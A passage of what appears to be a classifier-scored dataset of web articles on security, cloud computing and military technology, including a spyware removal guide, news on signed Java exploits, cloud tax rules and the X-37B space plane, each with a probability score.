        "text": "Air Force Research Lab's vision for military MAVs In a recent blog post we've asked if autonomous battlefield robots can behave more ethically than humans. But today's weaponized robots are not the only ones that raise ethical concerns. The development of miniature robots will soon allow surveillance to move out of the cyberspace, bringing privacy concerns to a new level. A video released by the Air Force Research Laboratory and published via the Chicago Tribune now shows how the military envisions the future use of micro air vehicles (MAVs) for both, surveillance and direct attack missions using chemical or explosive payloads. The video shows a swarm of MAVs being dropped out of a high flying airplane and then goes on to explain how the MAVs could be hidden in plain sight, for example disguised as flies or doves. It envisions MAVs forming sensor networks to enhance their sensing and operating capabilities, and harvesting their energy from the environment including power lines to extend their mission time indefinitely.",
        "prob": "tensor([[8.7389e-04, 9.9913e-01]])"
    },
    {
        "text": "What are common sources of threats to mobile devices or the health information on them? The United States Government Accountability Office (GAO) recently issued a report to Congress called “Information Security: Better Implementation of Controls for Mobile Devices Should Be Encouraged.” The Report identified mobile device threat sources such as hackers, cybercriminals and Botnet operators. The Report explains how threat sources get control of or gain access to information on mobile devices. - Botnet Operators: Botnet operators widely distribute malware to mobile devices and coordinate remotely controlled attacks on websites. They also distribute phishing schemes, spam, and malware attacks on individual mobile devices. - Cybercriminals: Cyber criminals attack mobile devices for money. They gain access to information stored on a mobile device using spam, phishing or spyware/malware and use the information to commit identity theft, online fraud, and computer extortion. International criminal organizations attack mobile devices to conduct industrial espionage and large-scale money and intellectual property theft, posing a threat to corporations, institutions and government agencies. - Hackers: Hackers sometimes attack mobile devices to show their skills or gain prestige in the hacker community. Hacking used to require computer skills and knowledge, but today’s hackers can download attack scripts and protocols from the Internet and launch them against mobile devices.",
        "prob": "tensor([[2.0577e-06, 1.0000e+00]])"
    },
    {
        "text": "The digital signatures play a vital role in the organizations since this technology enables the businesses to reduce the human errors, ultimately minimizes the paper work. Digital signatures enable the businesses to manage their monetary subsidiary and cost of paper work. Also, these signatures help the companies in proving that they’re utilizing the green policies and eco friendly procedures by cutting back the use of paper. This vast technology even reduces the time consumed in sending numerous emails and documents, since the entire work is entitled in few moments. The corporations prove their sharp time management skills through this technology. What does a digital signature actually do? Most businesses use the digital signatures for the different types of paper transactions. These signatures analyze and approve the documents directly, as the whole information is preserved digitally by them. Thus, there is no more need to move to various locations for documents approval. Nowadays, most of the companies and corporations in the market are adopting this technology for business purposes. The great thing about it is that it’s an efficient and safe method that ensures the security and reliability of the confidential information. Since, it’s a secure method most of the companies use this technology. Digital signatures enable the huge companies and businesses to store and secure their essential documents digitally. What’s the role of digital encryption in the digital signatures process? The digital signatures technique has one aspect named as digital encryption that is significant in the whole procedure of this method. This technology enables the companies to acknowledge and authenticate the user’s id. Digital encryption can validate various kinds of digitally stored contents and documents. Often the digitally stored files ensure that their content won’t be accessed and attacked through an illegal process. The hash methods and numerical values are used to protect the data. In order to access the information the users are asked to follow the validation procedures to generate the permission and after the validation the user will be able to access the information. In this whole procedure if the user tries to access or copy the data illegally the system never allows the user to do it because the keys entered by him won’t match certain authentication keys. Thus, he won’t be able to get into the documents stored by the digital signatures. First the confirmation is asked to the receiver, thus the authenticity totally lies on the reliability of the user. Significance of protective measures in digital signatures: As different kinds of variations occur in computer networks with time, the protection and authentication methods are hugely required to secure the information. Protection is required in every facet, so various kinds of strategies and processes should be applied to maintain the aspects related with security. Generally, the digital signatures are applied for different functions and its major function is to store and protect the confidential information. This major function involves in identifying the user, who is requesting to access the information and sending the security messages to the user.",
        "prob": "tensor([[1.5804e-05, 9.9998e-01]])"
    },
    {
        "text": "Cloud computing technology is deployed in three general types, based on the level of internal or external ownership and the technical merits: public cloud (external), private cloud (internal), or hybrid cloud. Public cloud is the provision of cloud computing services whereby applications, storage and other resources are shared among multiple customers over the internet or a private network, with varying degrees of data privacy control. Private cloud uses similar computing architectures to the public cloud, but is generally built, managed and used internally by an enterprise. Hybrid cloud is a mix of public cloud services, internal cloud computing architectures and traditional IT infrastructure, forming a hybrid model that meets the specific needs of the customers. Tax treatment of cloud computing There is no comprehensive set of US guidance for the tax treatment of cloud computing (e.g. characterization, sourcing and reporting obligations). The US Treasury instead adapts existing tax principles to the cloud rather than creating new or additional tax regimes. Characterization of income The character of the income earned from cloud computing drives the tax determinations of the treatment and the reporting obligations. Though the rules are not immediately clear, the character classification generally depends on the nature of the underlying interest that is granted to the customers as part of their access. Where the cloud operator earns income by providing access to applications, software, or storage, the transaction could be characterized as either a transfer of a computer program (sale or license) or a service provision that generates services income. The character of payments to a cloud computing provider generally depends on the following (non-exclusive) factors: - Whether any derivative rights (such as the rights to make copies for purposes of distribution or to prepare derivative work) relating to the application or software were transferred as part of the access. - Whether the customers have physical possession of or control over their access to the software. - Whether the customers bear the risk associated with the maintenance of the software or application. - Whether the customers have exclusive access to the applications and software. The determination will depend on the particular facts and circumstances of the arrangement. Generally, a transaction involving a computer program will be treated as a sales transaction if, subsequent to the transaction, the customer receives all substantial rights and bears the relevant benefits and risks of ownership with respect to the program. A transaction will be treated as a license if less than all substantial rights are transferred. Finally, a transaction will generally be treated as a provision of services if the customer merely has access to the computer program and does not bear the benefits and risks associated with ownership. Source of income The source of income depends on the underlying character of the income. Generally, sales income is sourced where title and risk of loss is transferred; royalty income is sourced where the underlying right or property is used or protected; and services income is sourced at the location where the services are performed. Even after the character of income has been determined, the source of income analysis may still not be straightforward. For example, for services income, there is little guidance over where the services are considered to be performed for business activities conducted over the Internet. Applicable authorities suggest that the US tax authorities may treat the services as being performed at the location of the servers, provided there is limited human or additional outside involvement in the provision of the services. The source of income can affect whether the income from cloud services will be taxable in the US, and whether withholding taxes are imposed on payments received from its cloud computing transactions. Corporate income tax Cloud computing providers that are treated as tax residents of the US are generally subject to tax at the graduated corporate income tax rate on all income earned, regardless of its source. Foreign corporations that provide cloud computing services (foreign opcos) are generally subject to corporate income tax in the US where their business income is connected with a US trade or business. A Foreign OpCo will generally be treated as conducting a US trade or business if it conducts considerable, continuous and regular business activities in the US. In addition, a Foreign OpCo may be treated as having a US trade or business through the activities of its agent, if the agent has the ability to bind or conclude contracts on behalf of the principal. There are no clear rules on whether a Foreign OpCo should be treated as having engaged in a US trade or business as a result of utilizing servers in the US. However, if the US servers function as a critical part of a foreign opco’s business operations, such fact may be sufficient for US tax authorities to argue that the Foreign OpCo engages in considerable, continuous and regular business activities in the US and therefore has a US trade or business. If a Foreign OpCo has a US trade or business, it is required to file a US federal income tax return, regardless of whether it has any income subject to tax during the taxable year. Nonetheless, the amount of income subject to US tax may be reduced or wholly exempted if the opco qualifies for benefits under an applicable US income tax treaty. Income tax treaty and permanent establishment If a Foreign OpCo qualifies for benefits under an applicable US income tax treaty, certain business income earned may be exempted from US corporate income tax. In most US income tax treaties, a Foreign OpCo must generally meet the requirements of the Limitation on Benefits Article to qualify for benefits under the treaty. While the specifics of the tests vary from treaty to treaty, a Foreign OpCo generally qualifies for benefits if it meets one of the following tests: - test based solely on ownership - ownership/base erosion test - active trade or business test. Where a Foreign OpCo earns business income that qualifies for benefits under an income tax treaty, it may be exempted from US corporate income tax if it does not have a permanent establishment (PE) in the US. In determining whether a particular cloud provider has a PE in the US, one must consider the location of the servers used by the provider, and the outside functions that may be required to operate the cloud computing operations. US tax authorities generally adopt the Organisation for Economic Co-operation and Development’s (OECD) approach, published in its commentary on e-Commerce, which considers an enterprise to have a PE at the location of the server, but only if the enterprise has the server at its own disposal. There are no specific criteria for determining when an enterprise may be considered to have a server at its disposal. However, the OECD commentary on PEs generally states that if a taxpayer owns (or leases) and operates the server, it may be treated as having a server at its disposal and, therefore, a PE. Thus, if a Foreign OpCo conducts its cloud operations through servers located in the US, there is a risk that it will be treated as having a US PE. However, where its cloud operations also require additional human intervention or other functions to be performed outside of the US, the Foreign OpCo may allocate portions of the income earned to those functions in accordance with the profit attribution principles under the treaty. A Foreign OpCo may be subject to US withholding tax if it earns US source income that is treated as fixed, determinable, annual and periodic (FDAP) income that is not effectively connected with a US trade or business. FDAP income is defined broadly to include most income that is not derived from gain from the sale of property. In cloud computing, typical FDAP income that may arise includes royalty, interest and dividend payments. If a Foreign OpCo earns US source FDAP income that is not connected with a US trade or business, such income will generally be subject to a 30 percent US withholding tax. The withhold tax on FDAP income may be reduced or wholly exempted if the Foreign OpCo qualifies for benefits under an applicable income tax treaty. US trade or business analysis Foreign OpCo may be treated as having a US trade or business in this case, because it is using its parent company’s US servers to accept orders from its customers. In addition, Foreign OpCo may also be treated as having a US trade or business based on the use of the server co’s US servers to host the platform that the customers access. Though reasonable arguments could be made otherwise, the significance of the US servers to the Foreign OpCo’s business operations is probably sufficient for US tax authorities to argue that Foreign OpCo has a US trade or business. If Foreign OpCo is treated as having a US trade or business, it will be subject to US tax on its US source income, either as income connected to a US trade or business (subject to graduated corporate income tax) or FDAP (subject to a 30 percent withholding). As previously discussed, the source of income will depend on the income tax characterization of the payments. If payments for access to the digital platform are treated as payments for the provision of services, the payments may be sourced in the US based on the location of the servers. Such US source income would generally be treated as effectively connected to foreign opco’s US trade or business if the income is derived from assets used in foreign opco’s conduct of a US trade or business, or if the activities of foreign opco’s US trade or business constitute a material factor in the realization of income. Assuming Foreign OpCo qualifies for benefits under an applicable income tax treaty, any income that is connected to a US trade or business may be exempted from US taxation if Foreign OpCo can establish that it does not have a US PE. In this case, Foreign OpCo may be treated as having a US PE through the activities of both server co and its US parent. A Foreign OpCo may argue that the activities of the server co should not establish a US PE on its behalf, if server company is legally and economically independent and does not otherwise act for or on behalf of the Foreign OpCo. The Foreign OpCo may have more difficulty establishing that its US parent is not its agent, because the parent has (and exercises) the authority to bind Foreign OpCo when the parent accepts the order on the US servers. Unless additional facts exist to establish that the parent acts as the principal and compensates the Foreign OpCo for its marketing services, it is likely that the Foreign OpCo will be treated as having a US PE as a result of its agency relationship with the US parent. As a result, the Foreign OpCo’s income that is attributable to the US PE will be subject to corporate income tax in the US. Related party transactions If taxpayers engage in related party transactions as part of their cloud operations, such transactions are generally subject to US transfer pricing principles under Section 482. Generally, taxpayers that engage in related-party or controlled transactions may be subject to adjustments and allocations of income and deductions by the US tax authorities, if the transaction does not meet the arm’s length standard under Section 482. In order to avoid transfer pricing adjustment-related penalties, taxpayers must maintain adequate transfer pricing documentation that meets the regulatory guidelines. State income tax There are two key state income tax issues that cloud computing providers should address. First, does the enterprise have sufficient connection (nexus) in a particular state that would create an obligation to file state income tax returns? Second, if the enterprise has nexus in the state, does the enterprise have to include income from cloud computing when determining the state’s apportionment formula? States generally have not issued comprehensive or uniform guidance on how a cloud computing arrangement should be treated and taxed. As a result, enterprises that provide cloud computing services should analyze on a state-by-state basis whether and how much of their income from cloud operations should be subject to state income tax. Sales and use tax In addition to state income tax, most states also impose sales and use tax collection responsibility on businesses that operate within their jurisdiction. Generally, the character of the transaction and source of the income derived from the transaction are the issues that need to be analyzed for sales and use tax purposes. Most states have not issued guidance on how the traditional sales and use tax principles should be applied to the provision of cloud computing services. To the extent that guidance has been issued, it is often limited and differs for each jurisdiction. As there can be significant differences between the states on how the same cloud computing transaction should be treated, cloud providers (and to some extent, their customers) should carefully analyze the transaction on a state-by-state basis, to determine whether they have any sales and use tax obligation.",
        "prob": "tensor([[3.0781e-06, 1.0000e+00]])"
    },
    {
        "text": "What you can do about spyware and other unwanted software What is spyware? Spyware is a general term used for software that performs certain behaviors such as advertising, collecting personal information, or changing the configuration of your computer, generally without appropriately obtaining your consent. You might have spyware or other unwanted software on your computer if: ? You see pop-up advertisements even when you're not on the Web. ? The page your Web browser first opens to (your home page) or your browser search settings have changed without your knowledge. ? You notice a new toolbar in your browser that you didn't want, and find it difficult to get rid of. ? Your computer takes longer than usual to complete certain tasks. ? You experience a sudden rise in computer crashes. Spyware is often associated with software that displays advertisements (called adware) or software that tracks personal or sensitive information. That does not mean all software which provides ads or tracks your online activities is bad. For example, you might sign up for a free music service, but \"pay\" for the service by agreeing to receive targeted ads. If you understand the terms and agree to them, you may have decided that it is a fair tradeoff. You might also agree to let the company track your online activities to determine which ads to show you. Other kinds of unwanted software will make changes to your computer that can be annoying and can cause your computer slow down or crash. These programs have the ability to change your Web browser's home page or search page, or add additional components to your browser you don't need or want. These programs also make it very difficult for you to change your settings back to the way you originally had them. These types of unwanted programs are also often called spyware. The key in all cases is whether or not you (or someone who uses your computer) understand what the software will do and have agreed to install the software on your computer. There are a number of ways spyware or other unwanted software can get on your system. A common trick is to covertly install the software during the installation of other software you want such as a music or video file sharing program. Whenever you are installing something on your computer, make sure you carefully read all disclosures, including the license agreement and privacy statement. Sometimes the inclusion of unwanted software in a given software installation is documented, but it may appear at the end of a license agreement or privacy statement. Signs of spyware If your computer starts to behave strangely or displays any of the symptoms listed below, you may have spyware or other unwanted software installed on your computer. ? I see pop-up advertisements all the time. Some unwanted software will bombard you with pop-up ads that aren't related to a particular Web site you're visiting. These ads are often for adult or other Web sites you may find objectionable. If you see pop-up ads as soon as you turn on your computer or when you're not even browsing the Web, you may have spyware or other unwanted software on your computer. ? My settings have changed and I can't change them back to the way they were. Some unwanted software has the ability to change your home page or search page settings. This means that the page that opens first when you start your Internet browser or the page that appears when you select \"search\" may be pages that you do not recognize. Even if you know how to adjust these settings, you may find that they revert back every time you restart your computer. ? My Web browser contains additional components that I don't remember downloading. Spyware and other unwanted software can add additional toolbars to your Web browser that you don't want or need. Even if you know how to remove these toolbars, they may return each time you restart your computer. ? My computer seems sluggish. Spyware and other unwanted software are not necessarily designed to be efficient. The resources these programs use to track your activities and deliver advertisements can slow down your computer and errors in the software can make your computer crash. If you notice a sudden increase in the number of times a certain program crashes, or if your computer is slower than normal at performing routine tasks, you may have spyware or other unwanted software on your machine. How to get rid of spyware Many kinds of unwanted software, including spyware, are designed to be difficult to remove. If you try to uninstall this software like any other program, you might find that the program reappears as soon as you restart your computer. If you're having trouble uninstalling unwanted software, you may need to download a tool to do the job for you. Several companies offer free and low-cost software that will check your computer for spyware and other unwanted software and help you remove it. Some Internet Service Providers (ISPs) include anti-spyware software in their service packages. Check with your ISP to see if they can recommend or provide a tool. If your ISP doesn't offer a removal tool for spyware and other unwanted software, ask people you trust to recommend one, or see the list below for a few well-known tools. Keep in mind that removing unwanted software with these tools may mean you will no longer be able to use a free program that came with the spyware. To remove spyware 1. Download the new Microsoft Windows AntiSpyware (Beta) or another spyware removal tool. 2. Run the tool to scan your computer for spyware and other unwanted software. 3. Review the files discovered by the tool for spyware and other unwanted software. 4. Select suspicious files for removal by following the tool's instructions. How to prevent spyware Spyware and other unwanted software can invade your privacy, bombard you with pop-up windows, slow down your computer, and even make your computer crash. Here are several ways you can help protect your computer against spyware and other unwanted software. Step 1: Update your software If you use Windows XP, one way to help prevent spyware and other unwanted software is to make sure all your software is updated. First, visit Windows Update to confirm that you have Automatic Updates turned on and that you've downloaded all the latest critical and security updates. Step 2: Adjust Internet Explorer security settings You can adjust your Internet Explorer Web browser's security settings to determine how much?or how little?information you are willing to accept from a Web site. Microsoft recommends that you set the security settings for the Internet zone to Medium or higher. To view your current Internet Explorer security settings: 1. In Internet Explorer, click Tools and then click Internet Options. 2. Select the Security tab. If you're running Windows XP Service Pack 2 (SP2) and you use Internet Explorer to browse the Web, your browser security settings for the Internet zone are already set to Medium by default. Internet Explorer in Windows XP SP2 also includes a number of features to help protect against spyware and many other kinds of deceptive or unwanted software. Step 3: Use a firewall While most spyware and other unwanted software come bundled with other programs or originate from unscrupulous Web sites, a small amount of spyware can actually be placed on your computer remotely by hackers. Installing a firewall or using the firewall that's built into Windows XP provides a helpful defense against these hackers. To learn more about firewalls, read Why you should use a computer firewall and get answers to your Frequently asked questions about firewalls. Step 4: Surf and download more safely The best defense against spyware and other unwanted software is not to download it in the first place. Here are a few helpful tips that can protect you from downloading software you don't want: ? Only download programs from Web sites you trust. If you're not sure whether to trust a program you are considering downloading, ask a knowledgeable friend or enter the name of the program into your favorite search engine to see if anyone else has reported that it contains spyware. ? Read all security warnings, license agreements, and privacy statements associated with any software you download. ? Never click \"agree\" or \"OK\" to close a window. Instead, click the red \"x\" in the corner of the window or press the Alt + F4 buttons on your keyboard to close a window. ? Be wary of popular \"free\" music and movie file-sharing programs, and be sure you clearly understand all of the software packaged with those programs. Step 5: Download and install anti-spyware protection Microsoft currently offers anti-spyware beta software for download; more information is available on our Microsoft Windows AntiSpyware (Beta) site.",
        "prob": "tensor([[3.4950e-06, 1.0000e+00]])"
    },
    {
        "text": "Cybercriminals using digitally signed Java exploits to trick users - — 05 March, 2013 17:52 Security researchers warn that cybercriminals have started using Java exploits signed with digital certificates to trick users into allowing the malicious code to run inside browsers. A signed Java exploit was discovered Monday on a website belonging to the Chemnitz University of Technology in Germany that was infected with a Web exploit toolkit called g01pack, security researcher Eric Romang said Tuesday in a blog post. \"It's definitely go01 pack,\" Jindrich Kubec, director of threat intelligence at antivirus vendor Avast, said via email. The first sample of this signed Java exploit was detected on Feb. 28, he said. It was not immediately clear if this exploit targets a new vulnerability or an older Java flaw that has already been patched. Oracle released new Java security updates on Monday to address two critical vulnerabilities, one of which was being actively exploited by attackers. Java exploits have traditionally been delivered as unsigned applets -- Java Web applications. The execution of such applets used to be automated in older Java versions, which allowed hackers to launch drive-by download attacks that were completely transparent to the victims. Starting with the January release of Java 7 Update 11, the default security controls for Web-based Java content are set to high, prompting users for confirmation before applets are allowed to run inside browsers, regardless of whether they are digitally signed or not. That said, using signed exploits over unsigned ones does provide benefits for attackers, because the confirmation dialogs displayed by Java in the two cases are considerably different. The dialogs for unsigned Java applets are actually titled \"Security Warning.\" Digital signing is an important part of assuring users they can trust your code, Bogdan Botezatu, a senior e-threat analyst at antivirus vendor Bitdefender, said via email. The confirmation dialog displayed for signed code is much more discrete and less threatening than the one displayed in the case of unsigned code, he said. \"Additionally, Java itself processes signed and unsigned code differently and enforces security restrictions appropriately,\" Botezatu said. For example, if the Java security settings are set to \"very high,\" unsigned applets won't run at all, while signed applets will run if the user confirms the action. In corporate environments where very high Java security settings are enforced, code signing may be the only way for attackers to run a malicious applet on a targeted system, he said. This new Java exploit has also brought to light the fact that Java does not check for digital certificate revocations by default. The exploit found by researchers Monday was signed with a digital certificate that's most likely stolen. The certificate was issued by Go Daddy to a company called Clearesult Consulting based in Austin, Texas, and was subsequently revoked with a date of Dec 7, 2012. Certificate revocations can apply retroactively and it's not clear when exactly Go Daddy flagged the certificate for revocation. However, on Feb. 25, three days before the oldest sample of this exploit was detected, the certificate was already listed as revoked in the certificate revocation list published by the company, Kubec said. Despite this, Java sees the certificate as valid. On the \"Advanced\" tab of the Java control panel, under the \"Advanced security settings\" category, there are two options called \"Check certificates for revocation using Certificate Revocation Lists (CRLs)\" and \"Enable online certificate validation\" -- the second option uses OCSP (Online Certificate Status Protocol). Both of these options are disabled by default. Oracle does not have any comment about this issue at this time, Oracle's PR agency in the U.K. said Tuesday via email. \"Sacrificing security for convenience is a serious security oversight, especially as Java has been the most targeted third-party piece of software since November 2012,\" Botezatu said. However, Oracle is not alone in this, the researcher said, noting that Adobe ships Adobe Reader 11 with an important sandbox mechanism disabled by default for usability reasons. Both Botezatu and Kubec are convinced that attackers will increasingly start using digitally signed Java exploits in order to bypass Java's new security restrictions more easily. Security firm Bit9 recently revealed that hackers compromised one of its digital certificates and used it to sign malware. Last year, hackers did the same with a compromised digital certificate from Adobe. Those incidents and this new Java exploit are proof that valid digital certificates can end up signing malicious code, Botezatu said. In this context, actively checking for certificate revocations is particularly important because it is the only mitigation available in case of certificate compromise, he said. Users who require Java in a browser on a daily basis should consider enabling certificate revocation checking to better protect against attacks exploiting stolen certificates, said Adam Gowdiak, the founder of Polish vulnerability research firm Security Explorations, via email. Security Explorations researchers have found and reported over 50 Java vulnerabilities in the past year. While users should manually enable these certificate revocation options, many of them will probably not do it considering that they don't even install security updates, Kubec said. The researcher hopes that Oracle will turn on the feature automatically in a future update.",
        "prob": "tensor([[2.1377e-06, 1.0000e+00]])"
    },
    {
        "text": "Passwords are an integral part of securing both IT systems and online accounts. In order to keep your system and information safe, it is important to take the time to create strong passwords that hackers and online thieves won't easily figure out. If you think using 'password' as your password is no big deal, then it's time to rethink. Security experts have recently compiled a list of the worst passwords users can choose, and 'password' is at the very top of the list. Weak passwords make your information more vulnerable simply because hackers can guess them. It may be easier to pick a password that you don't have to think about, but it's a choice that you may come to regret. To help you avoid common password choice mistakes that users make, management application provider SplashData has compiled a list of the 25 worst passwords to use: No matter how sophisticated your security system is, a weak password gives hackers and online thieves an advantage. Helping all the users in your organization understand the importance of password strength will help you secure the IT systems in your organization. If you're interested in learning more, please contact us so we can develop a comprehensive and custom security blueprint that meets your specific needs. Reference: Worst Internet Passwords",
        "prob": "tensor([[2.0870e-06, 1.0000e+00]])"
    },
    {
        "text": "Phishing has always been one of the most common e-mail threats, but it has now become a fairly difficult threat to detect and block. As we noted earlier in the year, the content of phishing emails has become essentially identical to legitimate messages. From the point of view of blocking and detecting email based on content, this is a serious issue. Because they are so similar to legitimate emails, any pattern likely to detect these phishing messages is also likely to detect many legitimate messages. This would raise the number of false positives to unacceptable levels. Detecting phishing emails based on analyzing URLs also presents a challenge because phishing sites are going down very quickly after they go online. According to the Global Phishing Survey report for the first half of 2012 that was released by the Anti-Phishing Working Group, the average uptime of a phishing site is now down to below 24 hours, with the median uptime just below six hours. This means that there is now relatively limited time to analyze and detect malicious sites, potentially reducing the effectivity of URLs for detecting phishing messages.",
        "prob": "tensor([[2.0526e-06, 1.0000e+00]])"
    },
    {
        "text": "Air Force to launch robotic winged space planeApril 3rd, 2010 in Space & Earth / Space Exploration (AP) -- After a decade of development, the Air Force this month plans to launch a robotic spacecraft resembling a small space shuttle to conduct technology tests in orbit and then glide home to a California runway. The ultimate purpose of the X-37B Orbital Test Vehicle and details about the craft, which has been passed between several government agencies, however, remain a mystery as it is prepared for launch April 19 from Cape Canaveral, Fla. \"As long as you're confused you're in good shape,\" said defense analyst John Pike, director of Globalsecurity.org. \"I looked into this a couple of years ago - the entire sort of hypersonic, suborbital, scramjet nest of programs - of which there are upwards of a dozen. The more I studied it the less I understood it.\" The quietly scheduled launch culminates the project's long and expensive journey from NASA to the Pentagon's research and development arm and then to a secretive Air Force unit. Hundreds of millions of dollars have been spent on the X-37 program, but the current total has not been released. The launch date, landing sites and a fact sheet were released by Air Force spokeswoman Maj. Angie I. Blair. She said more information would be released soon, but questions on cost and other matters submitted by e-mail weren't answered by Friday. While the massive space shuttles have been likened to cargo-hauling trucks, the X-37B is more like a sports car, with the equivalent trunk capacity. Built by Boeing Co.'s Phantom Works, the 11,000-pound craft is 9 1/2 feet tall and just over 29 feet long, with a wingspan of less than 15 feet. It has two angled tail fins rather than a single vertical stabilizer. Unlike the shuttle, it will be launched like a satellite, housed in a fairing atop an expendable Atlas V rocket, and deploy solar panels to provide electrical power in orbit. The Air Force released only a general description of the mission objectives: testing of guidance, navigation, control, thermal protection and autonomous operation in orbit, re-entry and landing. The mission's length was not released but the Air Force said the X-37B can stay in orbit for 270 days. The primary landing site will be northwest of Los Angeles at coastal Vandenberg Air Force Base. The significance of the X-37B is unclear because the program has been around for so long, said Peter A. Wilson, a senior defense research analyst for the RAND Corp. who several years ago served as executive director of a congressional panel that evaluated national security space launch requirements. \"From my perspective it's a little puzzling as to whether this is the beginning of a program or the end of one,\" Wilson said Friday in a telephone interview from Washington, D.C. As NASA anticipated the end of the shuttle, the X-37B was viewed as a working prototype of the next-generation design of a fully reusable spacecraft, but the space agency lost interest and the Air Force picked it up, Wilson said. \"It's viewed as a prototype of a vehicle that could carry small payloads into orbit, carry out a variety of military missions and then return to Earth,\" he said. The Air Force statement said the X-37 program is being used \"to continue full-scale development\" and orbital testing of a long-duration, reusable space vehicle. Wilson sees the upcoming launch as \"a one-shot deal.\" He acknowledged that he does not know if there is a classified portion of the program but said there is no evidence of a second vehicle being built to follow the prototype. In aerospace, a prototype typically remains a test vehicle used to prove and improve designs for successive operational vehicles. To fully function as a completely reusable launch system there would also have to be development of a booster rocket that is capable of landing itself back on Earth to be reassembled with the spacecraft, according to Wilson, who does not see any support for such an initiative. Wilson also said the usefulness of payloads such as small military satellites is in question, which would undercut the need for the launch system. The X-37B is now under the direction of the Air Force's Rapid Capabilities Office. Its mission is to speed up development of combat-support systems and weapons systems. Operating since 2003, the office has worked on several things, including upgrading the air defenses around the nation's capital as an anti-terrorism measure and assessing threats to U.S. combat operations, according to an Air Force fact sheet. NASA began the X-37 program in 1999 in a cooperative deal with Boeing to roughly split the $173 million cost of developing an experimental space plane. The Air Force put in a small share. The X-37, initially intended to be carried into space by shuttles in 2003, was a larger version of the Air Force X-40A, a concept for a \"Space Maneuver Vehicle\" to put small military satellites in orbit. The X-40A was dropped from a helicopter in glide and landing tests but was never capable of actual space flight. In 2002, NASA awarded Boeing a $301 million contract to complete a version of the X-37 to be used in approach and landing tests and begin designing an orbital version that would fly in 2006. But in 2004 NASA turned the project over to the Defense Advanced Research Projects Agency, the Defense Department's research and development arm. In 2006, the X-37 was put through captive-carry and drop tests using Mojave-based Scaled Composite LLC's White Knight, the jet that launched SpaceShipOne on the first private suborbital manned space flights. The Air Force then began work on the X-37B, projecting it would fly in 2008. An Air Force News story at the time reported that the first one or two flights would check out the performance of the vehicle itself and then it would become a space test platform with unspecified components flown in its experiment bay. ©2010 The Associated Press. All rights reserved. This material may not be published, broadcast, rewritten or redistributed. \"Air Force to launch robotic winged space plane.\" April 3rd, 2010. http://phys.org/news189528362.html",
        "prob": "tensor([[0.0046, 0.9954]])"
    },
    {
        "text": "What different types of security do there exist? Why and when should they be implemented? Example: SQL Injection Prevention Preventing Buffer overflow I cannot count the exploit that are based on this. I am no expert, but in my experience, there are several well-known attack vectors for systems: Unvalidated user data This is the classic buffer-overrun, SQL injection, drive-by-download mechanism and is caused by insufficient planning or education on secure coding practices. It is important to ensure developers understand how any insecure code can be leveraged to exploit a zero-day attack on a computer. Just because your website doesn't do anything particularly secret/important, doesn't mean that getting root access on your webserver can't harm the other parts of the organisation. This can be a blend of poor security infrastructure, policy or just bad passwords. The worlds most popular password is 'password1' since most email providers started insisting on alpha-numeric passwords - previously it was 'password'. If a dictionary-based attack can guess a users' password, the policy was insufficient. Some enterprising programmers leave quick-access backdoors in code in case they need to jump in and 'fix' the system. If you have any of these, deliberate or otherwise, your system is a ticking time-bomb. What to do about it It depends completely on the type of app, what a potential exploit might accomplish and the expected environment. If you are running in an environment assumed to be safe then you could argue few to none. If you are writing a web app that is publicly exposed, or an app that involves a publicly exposed API you would have to think through the likely scenarios like defacement, false submissions, authentication exploits, getting access to data not belonging to you, etc. If you are building an app that stores data locally you might need to be concerned with the security of that data, keeping it separate between users on a multi-user system, etc. IMHO there are not any security concerns that are ALWAYS applicable in every situation. Based on the number of attacks - see stats by Verizon, OWASP, WHID and others - the single biggest thing you can do to improve the security of a web application is implement solid input validation. Do not trust anything the client/browser sends you. This will pretty much sort your SQL injection issue, and help out in a number of other areas including field/buffer overflow.",
        "prob": "tensor([[2.0366e-06, 1.0000e+00]])"
    },
    {
        "text": "Windows Azure Networking The easiest way to connect to Windows Azure applications and data is through an ordinary Internet connection. But this simple solution isn’t always the best approach. Windows Azure also provides technologies for connecting users to Windows Azure datacenters. This article takes a look at these technologies. Table of Contents Windows Azure Virtual Network Windows Azure lets you create virtual machines (VMs) that run in Microsoft datacenters. Suppose your organization wants to use those VMs to run enterprise applications or other software that will be used by your firm’s employees. Maybe you want to create a SharePoint farm in the cloud, for example, or run an inventory management application. To make life as easy as possible for your users, you’d like these applications to be accessible just as if they were running in your own datacenter. There’s a standard solution to this kind of problem: create a virtual private network (VPN). Organizations of all sizes do this today to link, say, branch office computers to the main company datacenter. This same approach can work with Windows Azure VMs, as Figure 1 shows. Figure 1: Windows Azure Virtual Network allows creating a virtual network in the cloud that’s connected to your on-premises datacenter. As the figure shows, Windows Azure Virtual Network lets you create a logical boundary around a group of VMs, called a virtual network or VNET, in a Windows Azure datacenter. It then lets you establish an IPsec connection between this VNET and your local network. The VMs in a VNET can be created using Windows Azure Virtual Machines, Windows Azure Cloud Services, or both. In other words, they can be VMs created using either Windows Azure’s Infrastructure as a Service (IaaS) technology or its Platform as a Service (PaaS) technology. Whatever choice you make, creating the IPsec connection requires a VPN gateway device, specialized hardware that’s attached to your local network, and it also requires the services of your network administrator. Once this connection is in place, the Windows Azure VMs running in your VNET look like just another part of your organization’s network. As Figure 1 suggests, you allocate IP addresses for the Windows Azure VMs from the same IP address space used in your own network. In the scenario shown here, which uses private IP addresses, the VMs in the cloud are just another IP subnet. Software running on your local network will see these VMs as if they were local, just as they do with traditional VPNs. And it’s important to note that because this connection happens at the IP level, the virtual and physical machines on both sides can be running any operating system. Windows Azure VMs running Windows Server or Linux can interact with on-premises machines running Windows, Linux, or other systems. It’s also possible to use mainstream management tools, including System Center and others, to manage the cloud VMs and the applications they contain. Using Windows Azure Virtual Network makes sense in many situations. As already mentioned, this approach lets enterprise users more easily access cloud applications. An important aspect of this ease of use is the ability to make the Windows Azure VMs part of an existing on-premises Active Directory domain to give users single sign-on to the applications they run. You can also create an Active Directory domain in the cloud if you prefer, then connect this domain to your on-premises network. Creating a VNET in a Windows Azure datacenter effectively gives you access to a large pool of on-demand resources. You can create VMs on demand, pay for them while they’re running, then remove them (and stop paying) when you no longer need them. This can be useful for scenarios that need fast access to a preconfigured machine, such as development teams building new software. Rather than wait for a local administrator to set up the resources they need, they can create these resources themselves in the public cloud. And just as Virtual Network makes Windows Azure VMs appear local to on-premises resources, the reverse is also true: Software running in your local network now appears to be local to applications running in your Windows Azure VNET. Suppose you’d like to move an existing on-premises application to Windows Azure, for example, because you’ve determined that it will be less expensive to operate in the cloud. But what if the data that application uses is required by law to be stored on premises? In a situation like this, using Virtual Network lets the cloud application see an on-premises database system as if it were local—accessing it becomes straightforward. Whatever scenario you choose, the result is the same: Windows Azure becomes an extension of your own 